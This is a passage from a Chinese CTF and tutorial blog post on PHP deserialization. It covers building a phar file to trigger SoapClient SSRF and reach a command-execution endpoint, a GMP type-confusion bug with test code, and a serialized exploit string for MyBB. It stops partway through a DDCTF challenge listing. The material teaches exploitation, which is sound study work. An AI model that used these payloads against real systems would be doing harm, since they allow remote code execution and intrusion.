        <span class="hljs-variable">$reflect</span> = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-keyword">$this</span>-&gt;clazz);
        <span class="hljs-keyword">$this</span>-&gt;instance = <span class="hljs-variable">$reflect</span>-&gt;newInstanceArgs();

        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func1);
        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg1);

        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func2);
        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg2);

        <span class="hljs-variable">$reflectionMethod</span> = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-keyword">$this</span>-&gt;clazz, <span class="hljs-keyword">$this</span>-&gt;func3);
        <span class="hljs-variable">$reflectionMethod</span>-&gt;invoke(<span class="hljs-keyword">$this</span>-&gt;instance, <span class="hljs-keyword">$this</span>-&gt;arg3);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
        system(<span class="hljs-keyword">$this</span>-&gt;cmd);
    &#125;
&#125;

<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]))&#123;
        <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];

        <span class="hljs-variable">$clazz</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;clazz&#x27;</span>];
        <span class="hljs-variable">$func1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func1&#x27;</span>];
        <span class="hljs-variable">$func2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func2&#x27;</span>];
        <span class="hljs-variable">$func3</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;func3&#x27;</span>];
        <span class="hljs-variable">$arg1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg1&#x27;</span>];
        <span class="hljs-variable">$arg2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg2&#x27;</span>];
        <span class="hljs-variable">$arg2</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;arg3&#x27;</span>];
        <span class="hljs-variable">$admin</span> = <span class="hljs-keyword">new</span> Ad(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$clazz</span>, <span class="hljs-variable">$func1</span>, <span class="hljs-variable">$func2</span>, <span class="hljs-variable">$func3</span>, <span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>, <span class="hljs-variable">$arg3</span>);
        <span class="hljs-variable">$admin</span>-&gt;check();
    &#125;
&#125;
<span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You r not admin!&quot;</span>;
&#125;</code></pre></div>



<p>可以直接看到命令执行的地方，需要绕过</p>
<p>$_SERVER[‘REMOTE_ADDR’] == ‘127.0.0.1’</p>
<p>这个地方基本上就是SSRF了</p>
<p>func.php</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;submit&quot;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;url&quot;</span>])) &#123;
    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;
        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Go away!&quot;</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-variable">$file_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> File(<span class="hljs-variable">$file_path</span>);
        <span class="hljs-variable">$file</span>-&gt;getMIME();
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Your file type is &#x27;<span class="hljs-subst">$file</span>&#x27; &lt;/p&gt;&quot;</span>;
    &#125;
&#125;

<span class="hljs-meta">?&gt;</span></code></pre></div>

<p>这里过滤了phar协议，但是可以使用php://filter协议进行绕过，跟进后又看到有很多的魔法函数，可以猜测考点在phar协议的利用</p>
<p>跟进看一看类File</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$type</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;Check&quot;</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-variable">$file_name</span>;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$class</span> = <span class="hljs-keyword">new</span> ReflectionClass(<span class="hljs-keyword">$this</span>-&gt;func);
        <span class="hljs-variable">$a</span> = <span class="hljs-variable">$class</span>-&gt;newInstanceArgs(<span class="hljs-keyword">$this</span>-&gt;file_name);
        <span class="hljs-variable">$a</span>-&gt;check();
    &#125;
    
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getMIME</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$finfo</span> = finfo_open(FILEINFO_MIME_TYPE);
        <span class="hljs-keyword">$this</span>-&gt;type = finfo_file(<span class="hljs-variable">$finfo</span>, <span class="hljs-keyword">$this</span>-&gt;file_name);
        finfo_close(<span class="hljs-variable">$finfo</span>);
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;type;
    &#125;

&#125;</code></pre></div>

<p>由于phar协议涉及到文件操作，这里的getMIME正好进行finfo_file文件操作，这个函数很有可能能够进行利用。</p>
<p>考虑phar协议的利用：</p>
<ol>
<li>构造出phar文件</li>
<li>上传phar文件</li>
</ol>
<p>看看有没有上传点，index.php就是</p>
<p>index.php</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;

<span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/&quot;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);
<span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$userdir</span>)) &#123;
    mkdir(<span class="hljs-variable">$userdir</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);
&#125;
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;upload&quot;</span>])) &#123;
    <span class="hljs-comment">// 允许上传的图片后缀</span>
    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);
    <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];
    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];
    <span class="hljs-variable">$temp</span> = explode(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$file_name</span>);
    <span class="hljs-variable">$extension</span> = end(<span class="hljs-variable">$temp</span>);
    <span class="hljs-keyword">if</span> (((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/gif&quot;</span>)
            || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/jpeg&quot;</span>)
            || (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>] == <span class="hljs-string">&quot;image/png&quot;</span>))
        &amp;&amp; (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &lt; <span class="hljs-number">204800</span>)   <span class="hljs-comment">// 小于 200 kb</span>
        &amp;&amp; in_array(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)
    ) &#123;
        <span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> Check(<span class="hljs-variable">$tmp_name</span>);
        <span class="hljs-variable">$c</span>-&gt;check();
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>) &#123;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;错误：: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;
            <span class="hljs-keyword">die</span>();
        &#125; <span class="hljs-keyword">else</span> &#123;
            move_uploaded_file(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/&quot;</span> . md5(<span class="hljs-variable">$file_name</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$extension</span>);
            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件存储在: &quot;</span> . <span class="hljs-variable">$userdir</span> . <span class="hljs-string">&quot;/&quot;</span> . md5(<span class="hljs-variable">$file_name</span>) . <span class="hljs-string">&quot;.&quot;</span> . <span class="hljs-variable">$extension</span>;
        &#125;
    &#125; <span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;非法的文件格式&quot;</span>;
    &#125;
    
&#125;</code></pre></div>

<p>上传的文件需要经过校验：</p>
<ol>
<li><p><code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>文件类型校验</p>
</li>
<li><p><code>in_array($extension, $allowedExts)</code>白名单校验</p>
</li>
<li><p>Check类的check函数</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Check</span></span>&#123;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file_name</span></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-variable">$file_name</span>;
    &#125;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-keyword">$this</span>-&gt;file_name);
        <span class="hljs-keyword">if</span> (mb_strpos(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;&lt;?&quot;</span>) !== <span class="hljs-literal">FALSE</span>) &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&amp;lt;? in contents!&quot;</span>);
        &#125;
    &#125;
&#125;</code></pre></div>

<p>文件内容中不能出现<code>&lt;?</code></p>
</li>
</ol>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>访问index上传phar文件，需要改一个后缀</li>
<li>访问func利用phar协议触发反序列化</li>
<li>利用反序列化调用wakeup函数发送soap访问admin.php，执行系统命令。</li>
<li></li>
</ol>
<h4 id="准备phar文件"><a href="#准备phar文件" class="headerlink" title="准备phar文件"></a>准备phar文件</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file_name</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$type</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;SoapClient&quot;</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;file_name = <span class="hljs-keyword">array</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-string">&quot;http://127.0.0.1/admin.php&quot;</span>, <span class="hljs-string">&#x27;uri&#x27;</span> =&gt; <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&#x27;user_agent&#x27;</span> =&gt; <span class="hljs-string">&quot;catcat\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\ncmd=ls&amp;admin=1&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n&quot;</span>));
    &#125;

&#125;

<span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> File();
<span class="hljs-variable">$phar</span>=<span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;poc.phar&#x27;</span>);
<span class="hljs-variable">$phar</span>-&gt;startBuffering();
<span class="hljs-variable">$phar</span>-&gt;setStub(<span class="hljs-string">&quot;GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;&quot;</span>);
<span class="hljs-variable">$phar</span>-&gt;setMetadata(<span class="hljs-variable">$o</span>);
<span class="hljs-variable">$phar</span>-&gt;addFromString(<span class="hljs-string">&quot;foo.txt&quot;</span>,<span class="hljs-string">&quot;bar&quot;</span>);
<span class="hljs-variable">$phar</span>-&gt;stopBuffering();</code></pre></div>



<p>注意这里 对phar文件的Stub头的构造，&lt;和？中间加了一个空格绕过了Check类的check检查，这个修改对phar文件没有影响</p>
<p>phar文件识别的标志为<code>__HALT_COMPILER();?&gt;</code> 前面可以任意修改，这就可以绕过很多限制。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p><code>php://filter/resource=phar://upload/46c01c941bd10a9c3038752f7354f2e8/b1b288ddc6069e3befa40731e382b192.jpeg</code></p>
<h2 id="0x08-php-GMP反序列化类型混淆漏洞"><a href="#0x08-php-GMP反序列化类型混淆漏洞" class="headerlink" title="0x08 php GMP反序列化类型混淆漏洞"></a>0x08 php GMP反序列化类型混淆漏洞</h2><p>首先我们来看一段测试代码</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;ryat = <span class="hljs-number">1</span>;
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">b</span></span>&#123;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span> =<span class="hljs-number">1</span>;
&#125;

<span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;
<span class="hljs-variable">$obj</span>-&gt;aa = <span class="hljs-number">1</span>;
<span class="hljs-variable">$obj</span>-&gt;bb = <span class="hljs-number">2</span>;

<span class="hljs-variable">$obj2</span> = <span class="hljs-keyword">new</span> b;

<span class="hljs-variable">$obj3</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;
<span class="hljs-variable">$obj3</span>-&gt;aa =<span class="hljs-number">2</span>;


<span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:3:&#123;s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:3:&quot;obj&quot;:1:&#123;s:4:&quot;ryat&quot;;R:2;&#125;&#125;&#x27;</span>;
<span class="hljs-variable">$exploit</span> = <span class="hljs-string">&#x27;a:1:&#123;i:0;C:3:&quot;GMP&quot;:&#x27;</span>.strlen(<span class="hljs-variable">$inner</span>).<span class="hljs-string">&#x27;:&#123;&#x27;</span>.<span class="hljs-variable">$inner</span>.<span class="hljs-string">&#x27;&#125;&#125;&#x27;</span>;
<span class="hljs-variable">$x</span> = unserialize(<span class="hljs-variable">$exploit</span>);

<span class="hljs-variable">$obj4</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">stdClass</span>;

var_dump(<span class="hljs-variable">$x</span>);
var_dump(<span class="hljs-variable">$obj</span>);
var_dump(<span class="hljs-variable">$obj2</span>);    
var_dump(<span class="hljs-variable">$obj3</span>);
var_dump(<span class="hljs-variable">$obj4</span>);

<span class="hljs-meta">?&gt;</span></code></pre></div>



<p>让我们来看看结果是什么？</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;
  [<span class="hljs-number">0</span>]=&gt;
  &amp;<span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)
&#125;
<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#1 (3) &#123;</span>
  [<span class="hljs-string">&quot;aa&quot;</span>]=&gt;
  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;hi&quot;</span>
  [<span class="hljs-string">&quot;bb&quot;</span>]=&gt;
  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;hi&quot;</span>
  [<span class="hljs-number">0</span>]=&gt;
  <span class="hljs-keyword">object</span>(obj)<span class="hljs-comment">#5 (1) &#123;</span>
    [<span class="hljs-string">&quot;ryat&quot;</span>]=&gt;
    &amp;<span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)
  &#125;
&#125;
<span class="hljs-keyword">object</span>(b)<span class="hljs-comment">#2 (1) &#123;</span>
  [<span class="hljs-string">&quot;ryat&quot;</span>]=&gt;
  <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)
&#125;
<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#3 (1) &#123;</span>
  [<span class="hljs-string">&quot;aa&quot;</span>]=&gt;
  <span class="hljs-keyword">int</span>(<span class="hljs-number">2</span>)
&#125;
<span class="hljs-keyword">object</span>(<span class="hljs-built_in">stdClass</span>)<span class="hljs-comment">#4 (0) &#123;</span>
&#125;
</code></pre></div>

<p>这个payload的效果将$obj的已有属性修改为我们传入的值</p>
<p>但如果我将反序列化的类改成b会发生什么呢？</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-variable">$inner</span> = <span class="hljs-string">&#x27;s:1:&quot;1&quot;;a:3:&#123;s:2:&quot;aa&quot;;s:2:&quot;hi&quot;;s:2:&quot;bb&quot;;s:2:&quot;hi&quot;;i:0;O:1:&quot;b&quot;:1:&#123;s:4:&quot;ryat&quot;;R:2;&#125;&#125;&#x27;</span>;</code></pre></div>

<p>很显然的是，并不会影响到其他的类变量</p>
<p>如果我们给class b加一个__Wakeup函数，那么又会产生一样的效果。</p>
<p>但如果我们把wakeup魔术方法中的变量设置为2</p>
<div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">obj</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$ryat</span>;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;ryat = <span class="hljs-number">2</span>;
    &#125;
&#125;</code></pre></div>

<p>返回的结果可以看出来，我们成功修改了第二个声明的对象。</p>
<p>但如果我们把ryat改为4，那么页面会直接返回500，因为我们修改了没有分配的对象空间。</p>
<p>在完成前面的试验后，我们可以把漏洞的利用条件简化一下。</p>
<p>如果我们有一个可控的<strong>反序列化入口</strong>，目标<strong>后端PHP安装了GMP插件</strong>（这个插件在原版php中不是默认安装的，但部分打包环境中会自带），如果我们找到一个<strong>可控的<code>__wakeup</code>魔术方法</strong>，我们就可以修改反序列化前声明的对象属性，并配合场景产生实际的安全问题。</p>
<p>如果目标的php版本在5.6 &lt;= 5.6.11中，我们可以直接使用内置的魔术方法来触发这个漏洞。</p>
<div class="hljs code-wrapper"><pre><code class="hljs php">var_dump(unserialize(<span class="hljs-string">&#x27;a:2:&#123;i:0;C:3:&quot;GMP&quot;:17:&#123;s:4:&quot;1234&quot;;a:0:&#123;&#125;&#125;i:1;O:12:&quot;DateInterval&quot;:1:&#123;s:1:&quot;y&quot;;R:2;&#125;&#125;&#x27;</span>));</code></pre></div>



<p>具体的mybb以及利用可以在参考连接中查看。</p>
<h3 id="mybb利用"><a href="#mybb利用" class="headerlink" title="mybb利用"></a>mybb利用</h3><div class="hljs code-wrapper"><pre><code class="hljs php">a:<span class="hljs-number">1</span>:&#123;i:<span class="hljs-number">0</span>;C:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;GMP&quot;</span>:<span class="hljs-number">106</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;5&quot;</span>;a:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;cache&quot;</span>;a:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;index&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;phpinfo()&#125;</span>&#125;&quot;</span>;&#125;i:<span class="hljs-number">0</span>;O:<span class="hljs-number">12</span>:<span class="hljs-string">&quot;DateInterval&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;y&quot;</span>;R:<span class="hljs-number">2</span>;&#125;&#125;&#125;&#125;</code></pre></div>



<h3 id="ecsho4-0-7利用"><a href="#ecsho4-0-7利用" class="headerlink" title="ecsho4.0.7利用"></a>ecsho4.0.7利用</h3><h3 id="例题：ddctf-web4-Overwrite-Me"><a href="#例题：ddctf-web4-Overwrite-Me" class="headerlink" title="例题：ddctf web4 Overwrite Me"></a>例题：ddctf web4 Overwrite Me</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
error_reporting(<span class="hljs-number">0</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyClass</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$kw0ng</span>;
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$flag</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;kw0ng = <span class="hljs-number">2</span>;
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_flag</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> system(<span class="hljs-string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="hljs-keyword">$this</span>-&gt;flag));
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HintClass</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$hint</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;hint))
        &#123;
            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Don&#x27;t Do That!&quot;</span>);
        &#125;
        <span class="hljs-keyword">$this</span>-&gt;execute(<span class="hljs-keyword">$this</span>-&gt;hint);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShowOff</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$contents</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$page</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;/hint/hint.php&#x27;</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;contents = <span class="hljs-variable">$file</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;
    &#125;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;contents();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;page-&gt;contents = <span class="hljs-string">&quot;POP me! I can give you some hints!&quot;</span>;
        <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;page-&gt;cont);
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MiddleMan</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cont</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;content = <span class="hljs-keyword">array</span>();
    &#125;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__unset</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-variable">$func</span> = <span class="hljs-keyword">$this</span>-&gt;content;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();
    &#125;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Info</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>&#123;
        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);
    &#125;

&#125;

